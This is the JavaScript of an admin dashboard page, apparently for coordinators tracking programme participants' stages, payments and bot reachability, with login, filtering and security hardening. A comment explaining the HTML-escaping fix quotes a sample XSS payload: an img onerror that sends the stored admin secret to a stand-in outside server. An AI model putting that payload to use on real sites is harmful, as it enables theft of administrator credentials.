<script>
/* ЗАЩИТА ОТ ВСТРАИВАНИЯ В ЧУЖОЙ САЙТ (06.10.2026). GitHub Pages не умеет
   отдавать заголовок X-Frame-Options, поэтому любую страницу координатора мог
   показать у себя в рамке посторонний сайт и подставлять под курсор её кнопки.
   Страница работает только сама по себе либо в рамке нашего же кабинета
   (admin-panel.html — тот же сайт). В чужой рамке прячем всё и пробуем
   открыть страницу вместо чужого сайта. */
(function () {
  var свой = false;
  try { свой = window.top === window.self || window.top.location.origin === window.location.origin; } catch (e) { свой = false; }
  if (свой) return;
  document.documentElement.style.display = "none";
  try { window.top.location = window.self.location.href; } catch (e) { /* рамка с sandbox — остаёмся спрятанными */ }
})();
</script>

<script type="module">
/**
 * ЭКРАНИРОВАНИЕ ВЫВОДА (02.09.2026).
 *
 * Всё, что приходит с бэкенда, вставлялось в страницу через innerHTML как есть.
 * Часть этих данных вводит не координатор и не amoCRM, а сам студент: имя
 * участника берётся из его профиля в Telegram (ensureParticipantRow_ в Api.gs).
 *
 * Чем это грозило. Человек ставит себе в Telegram имя вида
 *   <img src=x onerror="fetch('https://чужой-сервер/?s='+localStorage.wtusa_admin_secret)">
 * и один раз открывает Mini App — ссылка на бота публична, белого списка нет.
 * Как только координатор откроет эту страницу, код выполнится в его браузере и
 * утащит пароль администратора. А с этим паролем можно рассылать произвольные
 * сообщения на любые номера с рабочего WhatsApp-канала компании и привязывать
 * свой Telegram к чужим сделкам.
 *
 * esc() превращает пять символов, значимых для HTML, в безопасные сущности.
 * Применять на КАЖДОЙ подстановке чужих данных внутри innerHTML, включая
 * значения атрибутов (кавычки закрываются тем же способом).
 */
function esc(value) {
  return String(value === null || value === undefined ? "" : value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/**
 * СООБЩЕНИЯ НА СТРАНИЦЕ ВМЕСТО alert (12.10.2026).
 *
 * Что ломалось. Итог фоновых действий (ответ сервера после отправки, сбой
 * отметки, сбой загрузки) показывался окном alert: оно останавливает страницу,
 * пока его не закроют, а в кабинете (страница во фрейме) всплывало поверх
 * соседней вкладки. Пока окно висело, остальные ответы ждали — по одной
 * неудачной отметке посещаемости приходилось закрывать по окну на строку.
 *
 * Теперь — плашка вверху страницы: не мешает работать, остаётся, пока её не
 * закроют (✕); успешные сообщения исчезают сами через 10 секунд. Окна
 * confirm остались только прямо перед отправкой сообщений студентам.
 */
function сообщение(текст, вид) {
  const box = document.getElementById("toasts");
  if (!box) return;
  const el = document.createElement("div");
  el.className = "toast" + (вид ? " " + вид : "");
  el.setAttribute("role", вид === "err" ? "alert" : "status");
  const t = document.createElement("div");
  t.textContent = текст;
  const x = document.createElement("button");
  x.type = "button";
  x.className = "toast-x";
  x.title = "Закрыть";
  x.textContent = "✕";
  x.addEventListener("click", () => el.remove());
  el.append(t, x);
  box.appendChild(el);
  while (box.children.length > 4) box.firstElementChild.remove();
  if (вид === "ok") setTimeout(() => el.remove(), 10000);
}

import { BACKEND_URL } from "./js/services/config.js";
import { STAGES } from "./js/config/roadmap.config.js";

/**
 * ГДЕ ЛЕЖИТ ПАРОЛЬ (02.09.2026).
 *
 * Был localStorage — хранилище без срока жизни: пароль оставался в браузере
 * навсегда, кнопки «Выйти» не было ни на одной странице, и на общем офисном
 * компьютере любой, кто открывал адрес, сразу оказывался внутри. Удалить
 * сохранённый пароль можно было только через инструменты разработчика.
 *
 * Стало sessionStorage — то же самое, но привязанное ко вкладке: закрыли
 * вкладку, и пароль исчез. В пределах рабочего сеанса ничего не меняется,
 * перезаходить не нужно. Плюс появилась кнопка «Выйти».
 *
 * С 12.10.2026 (P17) пароль уходит в теле POST-запроса, а не в адресе — в
 * журнал выполнений Apps Script и историю браузера он больше не попадает.
 */
const SECRET_KEY = "wtusa_admin_secret";
const gateEl = document.getElementById("gate");
const mainEl = document.getElementById("main");

const STAGE_TITLE = new Map(STAGES.map((s) => [s.id, s.shortTitle || s.title]));
const STALE_DAYS = 14; // no activity for this long -> flagged for the coordinator's attention

let users = []; // adminListAllParticipants_ shape

// Хранилище браузера запрещено — код живёт в памяти страницы до перезагрузки (12.10.2026).
let секретВПамяти = "";
function secret() {
  // 05.10.2026: если в Chrome для сайта запрещены cookie и данные сайтов,
  // само обращение к sessionStorage бросает исключение — страница молча
  // переставала работать («Войти» ничего не делала).
  try {
    return sessionStorage.getItem(SECRET_KEY) || секретВПамяти;
  } catch (e) {
    return секретВПамяти;
  }
}

// ТАЙМ-АУТ ЗАГРУЗКИ (12.10.2026). Что ломалось: «холодный» сервер Google или
// зависшее соединение держали страницу на «Загрузка…» бесконечно, без единого
// слова. Теперь чтение списка обрывается через 45 секунд, и на странице
// появляется ошибка с кнопкой «Повторить».
const ТАЙМАУТ_ЗАГРУЗКИ_МС = 45000;

async function adminGet(action, extraParams, timeoutMs) {
  // P17 (12.10.2026): пароль — в теле POST, а не в адресе (адрес оседает в истории
    // браузера и журнале Google). Чтение тоже идёт POST-ом; сервер отвечает тем же.
    const params = new URLSearchParams({ action });
  const ctrl = timeoutMs && typeof AbortController === "function" ? new AbortController() : null;
  const timer = ctrl ? setTimeout(() => ctrl.abort(), timeoutMs) : null;
  try {
    const resp = await fetch(`${BACKEND_URL}?${params.toString()}`, {
      method: "POST",
      headers: { "Content-Type": "text/plain;charset=utf-8" },
      body: JSON.stringify(Object.assign({}, extraParams || {}, { secret: secret() })),
      signal: ctrl ? ctrl.signal : undefined,
    });
    const json = await resp.json();
    if (json.error) throw new Error(json.error);
    return json;
  } catch (err) {
    if (ctrl && ctrl.signal.aborted) throw new Error("TIMEOUT");
    throw err;
  } finally {
    if (timer) clearTimeout(timer);
  }
}

/**
 * ПОНЯТНЫЙ ТЕКСТ ОШИБКИ (05.10.2026). Координатор видел сырой технический
 * текст: «bad secret», «Failed to fetch», «Unexpected token '<', "<!DOCTYPE "...
 * is not valid JSON» (так выглядит страница ошибки Google вместо ответа).
 */
function понятнаяОшибка(err) {
  const m = String((err && err.message) || err || "");
  if (/bad secret/i.test(m)) return "неверный секретный код";
  if (m === "TIMEOUT") return "сервер не ответил за 45 секунд";
  if (/Failed to fetch|NetworkError|Load failed/i.test(m)) return "нет связи с сервером";
  if (/Unexpected token|not valid JSON|Unexpected end of/i.test(m)) return "сервер ответил не по формату (временный сбой на стороне Google)";
  if (/^unknown action/i.test(m)) return "сервер не распознал запрос (" + m + ")";
  return m || "попробуйте ещё раз";
}

function daysSince(iso) {
  if (!iso) return Infinity;
  return (Date.now() - new Date(iso).getTime()) / (1000 * 60 * 60 * 24);
}

/**
 * ДНИ НА ЭТАПЕ (05.10.2026). stageSince приходит как календарная дата Алматы
 * «2026-10-06». new Date("2026-10-06") — это полночь по UTC, то есть 05:00 в
 * Алматы: с полуночи до пяти утра у этапа, сменившегося сегодня, получалось
 * «-1 дн.». Считаем от полуночи Алматы и не уходим ниже нуля.
 */
function daysOnStage(ymd) {
  if (!ymd) return -1;
  const t = new Date(String(ymd).slice(0, 10) + "T00:00:00+05:00").getTime();
  if (isNaN(t)) return -1;
  return Math.max(0, (Date.now() - t) / (1000 * 60 * 60 * 24));
}

// Сделка закрыта / ушла из воронки. Поле active появится в ответе после правки
// бэкенда (adminListAllParticipants_: active: p.active === "no" ? "no" : "");
// пока его нет, страница ведёт себя как раньше.
const закрыт = (u) => u.active === "no";
// P13/P17 (12.10.2026): бот не может писать студенту (заблокировал бота или ни разу не открыл чат) —
// canWrite "no"; тестовые и исключённые сделки — excluded. Старый бэкенд этих полей не отдаёт —
// тогда ни плашек, ни отличий в цифрах.
const ботНеПишет = (u) => !закрыт(u) && u.canWrite === "no";
const тест = (u) => u.excluded === true;

function formatDate(iso) {
  if (!iso) return "—";
  return new Date(iso).toLocaleDateString("ru-RU", { day: "numeric", month: "short", year: "numeric" });
}

function formatRelative(iso) {
  if (!iso) return "никогда";
  const days = daysSince(iso);
  if (days < 1) return "сегодня";
  if (days < 2) return "вчера";
  if (days < 30) return `${Math.floor(days)} дн. назад`;
  const months = Math.floor(days / 30);
  return `${months} мес. назад`;
}

const STUCK_DAYS = 14;
let currentFilter = "all"; // all | stuck | overdue | stale | nobot
function applyFilter_(list) {
  // Закрытые сделки не «застряли»: они стоят на этапе навсегда и занимали
  // верх этого списка.
  const stuckDays = (u) => (закрыт(u) ? -1 : daysOnStage(u.stageSince));
  if (currentFilter === "stuck") return list.filter((u) => stuckDays(u) >= STUCK_DAYS).sort((a, b) => stuckDays(b) - stuckDays(a));
  if (currentFilter === "overdue") return list.filter((u) => u.overduePayments > 0).sort((a, b) => b.overduePayments - a.overduePayments);
  if (currentFilter === "stale") return list.filter((u) => !закрыт(u) && daysSince(u.lastActivity) > STALE_DAYS);
  if (currentFilter === "nobot") return list.filter(ботНеПишет);
  return list;
}
function renderFilters() {
  const items = [["all", "Все"], ["stuck", `На этапе ${STUCK_DAYS}+ дней`], ["overdue", "Просрочка оплаты"], ["stale", "Не заходили"], ["nobot", "Бот не может писать"]];
  // P12: из фильтра «Бот не может писать» — сразу в рассылку по WhatsApp со ссылкой на бота.
  const вРассылку = currentFilter === "nobot" ? `<a class="chip" data-to-broadcasts href="admin-broadcasts.html?segment=cannot_write" style="text-decoration:none">Рассылка этим →</a>` : "";
  return `<div class="filters">${items.map(([k, label]) => `<button type="button" class="chip${currentFilter === k ? " active" : ""}" data-filter="${k}">${label}</button>`).join("")}${вРассылку}</div>`;
}

function renderStats(all) {
  // Тестовые и исключённые сделки в цифрах не считаем (в таблице они остаются, с пометкой «тест»).
  const list = all.filter((u) => !тест(u));
  const total = list.length;
  const nobot = list.filter(ботНеПишет).length;
  const activeWeek = list.filter((u) => daysSince(u.lastActivity) <= 7).length;
  const stale = list.filter((u) => !закрыт(u) && daysSince(u.lastActivity) > STALE_DAYS).length;
  const stuck = list.filter((u) => !закрыт(u) && daysOnStage(u.stageSince) >= STUCK_DAYS).length;
  document.getElementById("stats-row").innerHTML = `
    <div class="stat-tile"><div class="num">${stuck}</div><div class="label">На этапе ${STUCK_DAYS}+ дней</div></div>
    <div class="stat-tile"><div class="num">${total}</div><div class="label">Всего подключено</div></div>
    <div class="stat-tile"><div class="num">${activeWeek}</div><div class="label">Активны за 7 дней</div></div>
    <div class="stat-tile"><div class="num">${stale}</div><div class="label">Не заходили ${STALE_DAYS}+ дней</div></div>
    <div class="stat-tile"><div class="num">${nobot}</div><div class="label">Бот не может писать</div></div>`;
}

function renderTable(filterText) {
  const wrap = document.getElementById("table-wrap");
  const q = (filterText || "").trim().toLowerCase();
  const filtered = q ? users.filter((u) => String(u.name).toLowerCase().includes(q)) : users;

  // 05.10.2026: при пустом результате поиска кнопки фильтров исчезали, и
  // было не видно, какой фильтр включён.
  const подключитьФильтры = () => {
    wrap.querySelectorAll("[data-filter]").forEach((b) => b.addEventListener("click", () => { currentFilter = b.dataset.filter; renderTable(filterText); }));
    // P12-аудит (12.10.2026): в кабинете ссылка «Рассылка этим →» открывала рассылки
    // прямо во фрейме «Студенты». Теперь — во вкладке «Рассылки» кабинета
    // (admin-panel.html, открытьВкладку); отдельно открытая страница идёт по ссылке как раньше.
    wrap.querySelectorAll("a[data-to-broadcasts]").forEach((a) => a.addEventListener("click", (e) => {
      if (window.parent === window) return;
      try {
        if (typeof window.parent.открытьВкладку === "function" && window.parent.открытьВкладку("broadcasts", a.getAttribute("href"))) e.preventDefault();
      } catch (err) { /* не наш кабинет — обычный переход по ссылке */ }
    }));
  };
  if (!filtered.length) {
    wrap.innerHTML = `${renderFilters()}<div class="sub" style="padding:12px">Никого не найдено.</div>`;
    подключитьФильтры();
    return;
  }

  // «КТО ЗАСТРЯЛ» (22.09.2026). Бэкенд теперь отдаёт stageSince (с какой
  // даты на текущем этапе), overduePayments и unansweredInvites. Считаем
  // дни на этапе, подсвечиваем 14+ и сортируем «застрявших» наверх, когда
  // включён фильтр. Фильтры — кнопки над таблицей (см. renderFilters).
  const stuckList = applyFilter_(filtered);
  const rows = stuckList
    .map((u) => {
      const stale = !закрыт(u) && daysSince(u.lastActivity) > STALE_DAYS;
      const днейНаЭтапе = daysOnStage(u.stageSince); // -1 — даты нет или она не разобралась
      const onStage = днейНаЭтапе >= 0 ? Math.floor(днейНаЭтапе) : null;
      const stuck = !закрыт(u) && onStage !== null && onStage >= STUCK_DAYS;
      const stageLabel = STAGE_TITLE.get(u.stage) || u.stage || "—";
      const programLine = [u.program, u.season].filter(Boolean).join(" · ") || "—";
      const flags = [
        закрыт(u) ? `<span class="badge-stale">сделка закрыта</span>` : "",
        тест(u) ? `<span class="badge-wait">тест / исключён</span>` : "",
        ботНеПишет(u) ? `<span class="badge-stale">бот не может писать</span>` : "",
        stuck ? `<span class="badge-stuck">на этапе ${onStage} дн.</span>` : "",
        // Счётчики — только числа (06.10.2026): это были две последние подстановки
        // в разметку без esc(); сервер шлёт числа, но страница на это не полагается.
        Number(u.overduePayments) > 0 ? `<span class="badge-stale">просрочено платежей: ${Number(u.overduePayments)}</span>` : "",
        Number(u.unansweredInvites) > 0 ? `<span class="badge-wait">без ответа на приглашение: ${Number(u.unansweredInvites)}</span>` : "",
      ].filter(Boolean).join("");
      return `
        <tr>
          <td><b>${esc(u.name)}</b><div class="muted">${esc(programLine)}</div>${flags ? `<div class="flags">${flags}</div>` : ""}</td>
          <td>${esc(stageLabel)}${onStage !== null ? `<div class="muted">${onStage === 0 ? "сегодня" : onStage + " дн."}</div>` : ""}</td>
          <td>${formatDate(u.createdAt)}</td>
          <td>${formatRelative(u.lastActivity)}${stale ? '<span class="badge-stale">давно не заходил</span>' : ""}</td>
        </tr>`;
    })
    .join("");

  wrap.innerHTML = `
    ${renderFilters()}
    <div style="overflow-x:auto">
    <table class="users">
      <thead><tr><th>Участник</th><th>Этап</th><th>Регистрация</th><th>Последняя активность</th></tr></thead>
      <tbody>${rows || `<tr><td colspan="4" class="muted" style="padding:14px">По этому фильтру никого.</td></tr>`}</tbody>
    </table>
    </div>`;
  подключитьФильтры();
}

// «Обновить» (12.10.2026): двойной щелчок больше не шлёт два запроса,
// зависший запрос обрывается по тому же тайм-ауту, что и первая загрузка.
let обновлениеСписка = null;
function loadUsers() {
  if (обновлениеСписка) return обновлениеСписка;
  обновлениеСписка = (async () => {
    const wrap = document.getElementById("table-wrap");
    wrap.innerHTML = `<div class="sub" style="padding:12px">Загрузка…</div>`;
    try {
      users = await adminGet("adminListAllParticipants", null, ТАЙМАУТ_ЗАГРУЗКИ_МС);
      renderStats(users);
      renderTable(document.getElementById("search-users").value);
    } catch (err) {
      wrap.innerHTML = `<div class="sub" style="padding:12px;color:var(--danger)">Не удалось загрузить список: ${esc(понятнаяОшибка(err))}</div>`;
    }
  })().finally(() => { обновлениеСписка = null; });
  return обновлениеСписка;
}

let entering = false; // guards against a double-click/double-Enter firing tryEnter() twice
let mainLoaded = false; // guards against loadMain() ever running (and re-binding listeners) twice

/**
 * ОДНА ЗАГРУЗКА ВМЕСТО ДВУХ И НИКАКОГО ЛОЖНОГО ВХОДА (12.10.2026).
 *
 * Что ломалось. При сохранённом коде страница сама начинала загрузку, но всё
 * это время (на холодном сервере Google — до минуты) на экране оставалась форма
 * входа. Координатор думал, что его «выкинуло», вводил код ещё раз — и уходил
 * второй такой же запрос; флаг mainLoaded ставился только в конце, поэтому оба
 * доходили до привязки обработчиков. Сбой загрузки показывался блокирующим
 * окном alert, а зависшая загрузка не кончалась никогда.
 *
 * Теперь: одна общая загрузка (повторный вызов получает тот же промис); пока
 * она идёт, вместо формы входа — «Загрузка…»; через 45 секунд — ошибка на
 * странице и кнопка «Повторить». Неверный код возвращает к форме входа с
 * пояснением под ней. Обработчики привязываются один раз — после первой
 * успешной загрузки.
 */
let загрузка = null;

function показатьЭкран(какой) {
  gateEl.style.display = какой === "gate" ? "" : "none";
  document.getElementById("boot").style.display = какой === "boot" ? "" : "none";
  mainEl.style.display = какой === "main" ? "block" : "none";
}

function показатьЗагрузку() {
  показатьЭкран("boot");
  const t = document.getElementById("boot-text");
  t.className = "sub";
  t.textContent = "Загрузка… На холодном сервере это может занять до минуты.";
  document.getElementById("boot-retry").style.display = "none";
}

function показатьСбойЗагрузки(текст) {
  показатьЭкран("boot");
  const t = document.getElementById("boot-text");
  t.className = "sub err";
  t.textContent = текст;
  document.getElementById("boot-retry").style.display = "";
}

function показатьВход(ошибка) {
  показатьЭкран("gate");
  document.getElementById("gate-err").textContent = ошибка || "";
}

async function init() {
  const gateSubmit = document.getElementById("gate-submit");
  const secretInput = document.getElementById("secret-input");

  async function tryEnter() {
    if (entering || загрузка) return;
    const value = secretInput.value.trim();
    if (!value) return;
    entering = true;
    gateSubmit.disabled = true;
    try {
      try {
        sessionStorage.setItem(SECRET_KEY, value);
      } catch (e) {
        // 12.10.2026: вместо окна alert — плашка, а код держим в памяти страницы:
        // работать можно, просто после обновления код придётся ввести снова.
        секретВПамяти = value;
        сообщение("Браузер не даёт сохранить код входа: в настройках Chrome для этого сайта запрещены cookie и данные сайтов. Страница работает, но после обновления код придётся ввести снова.", "warn");
      }
      document.getElementById("gate-err").textContent = "";
      await loadMain();
    } finally {
      entering = false;
      gateSubmit.disabled = false;
    }
  }
  gateSubmit.addEventListener("click", tryEnter);
  secretInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") tryEnter();
  });
  document.getElementById("boot-retry").addEventListener("click", () => loadMain());

  if (secret()) {
    await loadMain();
  } else {
    показатьЭкран("gate");
  }
}

function loadMain() {
  if (mainLoaded) {
    показатьЭкран("main");
    return Promise.resolve();
  }
  if (!загрузка) загрузка = первичнаяЗагрузка().finally(() => { загрузка = null; });
  return загрузка;
}

async function первичнаяЗагрузка() {
  показатьЗагрузку();
  try {
    users = await adminGet("adminListAllParticipants", null, ТАЙМАУТ_ЗАГРУЗКИ_МС);
  } catch (err) {
    // КОД СТИРАЕМ ТОЛЬКО ЕСЛИ ОН НЕВЕРНЫЙ (05.10.2026). Раньше любой сбой первой
    // загрузки (нет связи, страница ошибки Google) выглядел как «Не удалось
    // войти» и стирал код. В кабинете (admin-panel.html) код общий для трёх
    // вкладок: сбой в одной разлогинивал остальные — там следующее действие
    // отвечало «bad secret».
    const неверныйКод = /bad secret/i.test(String((err && err.message) || ""));
    if (неверныйКод) {
      try { sessionStorage.removeItem(SECRET_KEY); } catch (e) {}
      секретВПамяти = "";
      // Внутри кабинета возвращаем к общему экрану входа, а не к своему;
      // причину кабинет покажет под своей формой входа.
      if (window.parent !== window) {
        try { sessionStorage.setItem("wtusa_admin_gate_msg", "Неверный секретный код — введите его ещё раз."); } catch (e) {}
        try { window.parent.location.reload(); } catch (e) {}
      }
      показатьВход("Неверный секретный код — введите его ещё раз.");
    } else {
      показатьСбойЗагрузки("Не удалось загрузить данные: " + понятнаяОшибка(err) + ". Код входа сохранён — нажмите «Повторить».");
    }
    return;
  }

  mainLoaded = true;
  показатьЭкран("main");

  renderStats(users);
  renderTable("");

  let searchDebounce = null;
  document.getElementById("search-users").addEventListener("input", (e) => {
    clearTimeout(searchDebounce);
    const value = e.target.value;
    searchDebounce = setTimeout(() => renderTable(value), 200);
  });
  document.getElementById("refresh-btn").addEventListener("click", loadUsers);
}

init();

  // Выход: стираем пароль и возвращаем страницу к экрану входа. Перезагрузка —
  // самый честный способ сбросить всё загруженное состояние (списки участников,
  // сделок, результаты), чтобы после выхода на экране не осталось чужих данных.
  const logoutBtn = document.getElementById("logout-btn");
  if (logoutBtn) {
    // ВНУТРИ КАБИНЕТА ВЫХОД — ОБЩИЙ (05.10.2026). Страница во фрейме
    // admin-panel.html перезагружала только себя: соседние вкладки оставались
    // открытыми со списками студентов, а на экране было две кнопки «Выйти».
    const вКабинете = window.parent !== window;
    if (вКабинете) logoutBtn.style.display = "none";
    logoutBtn.addEventListener("click", () => {
      try { sessionStorage.removeItem(SECRET_KEY); } catch (e) {}
      try { (вКабинете ? window.parent : window).location.reload(); } catch (e) { location.reload(); }
    });
  }
</script>
</body>
</html>
